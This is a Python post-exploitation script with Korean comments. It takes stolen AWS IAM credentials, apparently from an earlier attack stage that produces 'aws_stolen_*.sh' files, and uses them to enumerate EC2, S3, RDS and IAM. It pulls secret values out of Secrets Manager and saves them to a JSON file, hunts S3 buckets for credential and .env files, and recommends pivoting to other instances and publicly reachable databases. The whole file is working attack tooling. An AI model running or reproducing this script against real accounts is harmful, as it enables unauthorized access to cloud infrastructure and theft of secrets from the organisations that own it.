#!/usr/bin/env python3
"""
AWS 권한 상승 및 횡적 이동

탈취한 IAM credentials를 사용하여:
  1. 현재 권한 확인
  2. 다른 EC2 인스턴스 발견
  3. S3 버킷 탐색 (추가 credentials)
  4. RDS 정보 수집
  5. Secrets Manager 접근
  6. 가능하면 더 높은 권한으로 escalation
"""

import boto3
import json
import sys
import os
from datetime import datetime
from botocore.exceptions import ClientError, NoCredentialsError

class AWSPrivilegeEscalation:
    def __init__(self, access_key=None, secret_key=None, session_token=None, region='ap-northeast-2'):
        """
        AWS credentials를 받아서 초기화
        환경 변수에서 자동으로 가져올 수도 있음
        """
        if access_key and secret_key:
            self.access_key = access_key
            self.secret_key = secret_key
            self.session_token = session_token
        else:
            # 환경 변수에서 가져오기
            self.access_key = os.getenv('AWS_ACCESS_KEY_ID')
            self.secret_key = os.getenv('AWS_SECRET_ACCESS_KEY')
            self.session_token = os.getenv('AWS_SESSION_TOKEN')

        if not self.access_key or not self.secret_key:
            print("[-] AWS credentials가 설정되지 않았습니다")
            print("[*] 환경 변수를 설정하거나 파라미터로 전달하세요")
            sys.exit(1)

        self.region = region
        self.findings = {
            'identity': None,
            'permissions': [],
            'ec2_instances': [],
            's3_buckets': [],
            'rds_instances': [],
            'secrets': [],
            'vulnerabilities': []
        }

        # Boto3 클라이언트 초기화
        self.session = boto3.Session(
            aws_access_key_id=self.access_key,
            aws_secret_access_key=self.secret_key,
            aws_session_token=self.session_token,
            region_name=self.region
        )

    def print_banner(self):
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  AWS 권한 상승 및 횡적 이동".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()

    def get_caller_identity(self):
        """현재 IAM 신원 확인"""
        print("[1] IAM 신원 확인 중...")
        print()

        try:
            sts = self.session.client('sts')
            identity = sts.get_caller_identity()

            self.findings['identity'] = identity

            print(f"[+] Account: {identity['Account']}")
            print(f"[+] User/Role ARN: {identity['Arn']}")
            print(f"[+] User ID: {identity['UserId']}")
            print()

            # Role 이름 추출
            if ':assumed-role/' in identity['Arn']:
                role_name = identity['Arn'].split(':assumed-role/')[1].split('/')[0]
                print(f"[+] Role Name: {role_name}")
                print()

            return True

        except ClientError as e:
            print(f"[-] 실패: {e}")
            return False

    def enumerate_ec2(self):
        """EC2 인스턴스 열거"""
        print("[2] EC2 인스턴스 탐색 중...")
        print()

        try:
            ec2 = self.session.client('ec2', region_name=self.region)
            response = ec2.describe_instances()

            instances = []
            for reservation in response['Reservations']:
                for instance in reservation['Instances']:
                    inst_info = {
                        'InstanceId': instance['InstanceId'],
                        'InstanceType': instance['InstanceType'],
                        'State': instance['State']['Name'],
                        'PrivateIp': instance.get('PrivateIpAddress', 'N/A'),
                        'PublicIp': instance.get('PublicIpAddress', 'N/A'),
                        'KeyName': instance.get('KeyName', 'N/A')
                    }

                    # Tags 추출
                    tags = {}
                    if 'Tags' in instance:
                        for tag in instance['Tags']:
                            tags[tag['Key']] = tag['Value']
                    inst_info['Tags'] = tags

                    instances.append(inst_info)

                    print(f"[+] Instance: {inst_info['InstanceId']}")
                    print(f"      Type: {inst_info['InstanceType']}")
                    print(f"      State: {inst_info['State']}")
                    print(f"      Private IP: {inst_info['PrivateIp']}")
                    print(f"      Public IP: {inst_info['PublicIp']}")
                    print(f"      Key: {inst_info['KeyName']}")
                    if tags:
                        print(f"      Tags: {tags}")
                    print()

            self.findings['ec2_instances'] = instances
            print(f"[+] 총 {len(instances)}개의 EC2 인스턴스 발견")
            print()

            return len(instances) > 0

        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code == 'UnauthorizedOperation':
                print("[-] 권한 없음: EC2 읽기 권한 없음")
            else:
                print(f"[-] 실패: {e}")
            print()
            return False

    def enumerate_s3(self):
        """S3 버킷 열거"""
        print("[3] S3 버킷 탐색 중...")
        print()

        try:
            s3 = self.session.client('s3')
            response = s3.list_buckets()

            buckets = []
            for bucket in response['Buckets']:
                bucket_name = bucket['Name']
                buckets.append({
                    'Name': bucket_name,
                    'CreationDate': bucket['CreationDate'].isoformat()
                })

                print(f"[+] Bucket: {bucket_name}")

                # 버킷 권한 확인
                try:
                    # 버킷 내용 리스트 시도
                    objects = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
                    if 'Contents' in objects:
                        print(f"      ✓ 읽기 가능 ({objects['KeyCount']} objects)")

                        # 흥미로운 파일 찾기
                        for obj in objects['Contents']:
                            key = obj['Key']
                            if any(keyword in key.lower() for keyword in ['key', 'secret', 'password', 'credential', 'config', '.env', 'backup']):
                                print(f"      🎯 관심 파일: {key}")
                                self.findings['vulnerabilities'].append({
                                    'type': 'S3_SENSITIVE_FILE',
                                    'bucket': bucket_name,
                                    'file': key
                                })
                except ClientError:
                    print(f"      ✗ 읽기 불가")

                print()

            self.findings['s3_buckets'] = buckets
            print(f"[+] 총 {len(buckets)}개의 S3 버킷 발견")
            print()

            return len(buckets) > 0

        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code == 'AccessDenied':
                print("[-] 권한 없음: S3 읽기 권한 없음")
            else:
                print(f"[-] 실패: {e}")
            print()
            return False

    def enumerate_rds(self):
        """RDS 데이터베이스 열거"""
        print("[4] RDS 데이터베이스 탐색 중...")
        print()

        try:
            rds = self.session.client('rds', region_name=self.region)
            response = rds.describe_db_instances()

            databases = []
            for db in response['DBInstances']:
                db_info = {
                    'DBInstanceIdentifier': db['DBInstanceIdentifier'],
                    'Engine': db['Engine'],
                    'EngineVersion': db['EngineVersion'],
                    'Endpoint': db.get('Endpoint', {}).get('Address', 'N/A'),
                    'Port': db.get('Endpoint', {}).get('Port', 'N/A'),
                    'MasterUsername': db['MasterUsername'],
                    'PubliclyAccessible': db['PubliclyAccessible']
                }

                databases.append(db_info)

                print(f"[+] Database: {db_info['DBInstanceIdentifier']}")
                print(f"      Engine: {db_info['Engine']} {db_info['EngineVersion']}")
                print(f"      Endpoint: {db_info['Endpoint']}:{db_info['Port']}")
                print(f"      Master User: {db_info['MasterUsername']}")
                print(f"      Public: {db_info['PubliclyAccessible']}")

                if db_info['PubliclyAccessible']:
                    print(f"      🎯 공격 가능: 외부 접근 가능한 DB!")
                    self.findings['vulnerabilities'].append({
                        'type': 'RDS_PUBLIC',
                        'database': db_info['DBInstanceIdentifier'],
                        'endpoint': f"{db_info['Endpoint']}:{db_info['Port']}"
                    })

                print()

            self.findings['rds_instances'] = databases
            print(f"[+] 총 {len(databases)}개의 RDS 인스턴스 발견")
            print()

            return len(databases) > 0

        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code == 'AccessDenied':
                print("[-] 권한 없음: RDS 읽기 권한 없음")
            else:
                print(f"[-] 실패: {e}")
            print()
            return False

    def enumerate_secrets(self):
        """Secrets Manager 비밀 열거"""
        print("[5] Secrets Manager 탐색 중...")
        print()

        try:
            secrets_mgr = self.session.client('secretsmanager', region_name=self.region)
            response = secrets_mgr.list_secrets()

            secrets = []
            for secret in response['SecretList']:
                secret_info = {
                    'Name': secret['Name'],
                    'ARN': secret['ARN'],
                    'LastChangedDate': secret.get('LastChangedDate', 'N/A')
                }

                secrets.append(secret_info)

                print(f"[+] Secret: {secret_info['Name']}")
                print(f"      ARN: {secret_info['ARN']}")

                # 비밀 값 가져오기 시도
                try:
                    secret_value = secrets_mgr.get_secret_value(SecretId=secret['Name'])

                    print(f"      ✓ 읽기 가능!")

                    if 'SecretString' in secret_value:
                        print(f"      🎯 내용: {secret_value['SecretString'][:100]}...")
                        self.findings['vulnerabilities'].append({
                            'type': 'SECRET_ACCESSIBLE',
                            'name': secret_info['Name'],
                            'value': secret_value['SecretString']
                        })

                except ClientError as e:
                    if e.response['Error']['Code'] == 'AccessDeniedException':
                        print(f"      ✗ 읽기 불가")
                    else:
                        print(f"      ✗ 오류: {e}")

                print()

            self.findings['secrets'] = secrets
            print(f"[+] 총 {len(secrets)}개의 비밀 발견")
            print()

            return len(secrets) > 0

        except ClientError as e:
            error_code = e.response['Error']['Code']
            if error_code in ['AccessDeniedException', 'UnrecognizedClientException']:
                print("[-] 권한 없음: Secrets Manager 접근 권한 없음")
            else:
                print(f"[-] 실패: {e}")
            print()
            return False

    def check_privilege_escalation(self):
        """권한 상승 가능성 확인"""
        print("[6] 권한 상승 가능성 확인 중...")
        print()

        escalation_paths = []

        # IAM 권한 확인
        try:
            iam = self.session.client('iam')

            # 사용자 나열 가능?
            try:
                iam.list_users()
                print("[+] IAM 사용자 나열 가능")
                escalation_paths.append("IAM User Enumeration")
            except ClientError:
                print("[-] IAM 사용자 나열 불가")

            # 역할 나열 가능?
            try:
                iam.list_roles()
                print("[+] IAM 역할 나열 가능")
                escalation_paths.append("IAM Role Enumeration")
            except ClientError:
                print("[-] IAM 역할 나열 불가")

            # 정책 연결 가능?
            try:
                # 실제로 실행하지 않고 권한만 테스트
                print("[*] IAM 정책 수정 권한 테스트...")
                # (실제 환경에서는 조심스럽게)
            except ClientError:
                pass

        except Exception as e:
            print(f"[-] IAM 확인 실패: {e}")

        print()

        if escalation_paths:
            print(f"[+] 권한 상승 경로 발견: {len(escalation_paths)}개")
            for path in escalation_paths:
                print(f"      • {path}")
        else:
            print("[-] 명확한 권한 상승 경로 없음")

        print()

    def save_findings(self):
        """발견 사항을 파일로 저장"""
        print("[7] 발견 사항 저장 중...")
        print()

        timestamp = int(datetime.now().timestamp())
        filename = f"aws_findings_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.findings, f, indent=2, default=str)

        print(f"[+] 저장 완료: {filename}")
        print()

    def generate_report(self):
        """최종 보고서 생성"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  최종 보고서                                               ║")
        print("╚" + "═"*58 + "╝")
        print()

        print("[*] 발견 요약:")
        print(f"    • EC2 인스턴스: {len(self.findings['ec2_instances'])}개")
        print(f"    • S3 버킷: {len(self.findings['s3_buckets'])}개")
        print(f"    • RDS 데이터베이스: {len(self.findings['rds_instances'])}개")
        print(f"    • Secrets: {len(self.findings['secrets'])}개")
        print(f"    • 취약점: {len(self.findings['vulnerabilities'])}개")
        print()

        if self.findings['vulnerabilities']:
            print("[!] 발견된 취약점:")
            for vuln in self.findings['vulnerabilities']:
                print(f"    🎯 {vuln['type']}")
                for key, value in vuln.items():
                    if key != 'type':
                        print(f"        {key}: {value}")
            print()

        print("[*] 추천 다음 단계:")
        print("    1. S3 버킷에서 중요 파일 다운로드")
        print("    2. 공개 RDS에 연결 시도")
        print("    3. 다른 EC2 인스턴스로 pivot")
        print("    4. Secrets Manager 값으로 추가 접근")
        print()

    def run(self):
        """전체 열거 및 공격 실행"""
        self.print_banner()

        # Phase 1: 신원 확인
        if not self.get_caller_identity():
            print("[-] 자격 증명이 유효하지 않습니다")
            return False

        # Phase 2: EC2 열거
        self.enumerate_ec2()

        # Phase 3: S3 열거
        self.enumerate_s3()

        # Phase 4: RDS 열거
        self.enumerate_rds()

        # Phase 5: Secrets 열거
        self.enumerate_secrets()

        # Phase 6: 권한 상승
        self.check_privilege_escalation()

        # Phase 7: 저장
        self.save_findings()

        # Phase 8: 보고서
        self.generate_report()

        print("╔" + "═"*58 + "╗")
        print("║  ✅ AWS 인프라 열거 완료                                   ║")
        print("╚" + "═"*58 + "╝")
        print()

        return True

def main():
    print()

    # 환경 변수 확인
    if not os.getenv('AWS_ACCESS_KEY_ID'):
        print("[-] AWS credentials가 설정되지 않았습니다")
        print()
        print("다음 중 하나를 수행하세요:")
        print()
        print("1. 환경 변수 설정:")
        print('   export AWS_ACCESS_KEY_ID="..."')
        print('   export AWS_SECRET_ACCESS_KEY="..."')
        print('   export AWS_SESSION_TOKEN="..."')
        print()
        print("2. 이전 단계에서 생성된 파일 사용:")
        print("   source aws_stolen_*.sh")
        print()
        sys.exit(1)

    # Region 설정
    region = os.getenv('AWS_DEFAULT_REGION', 'ap-northeast-2')

    # 공격 실행
    escalation = AWSPrivilegeEscalation(region=region)
    success = escalation.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
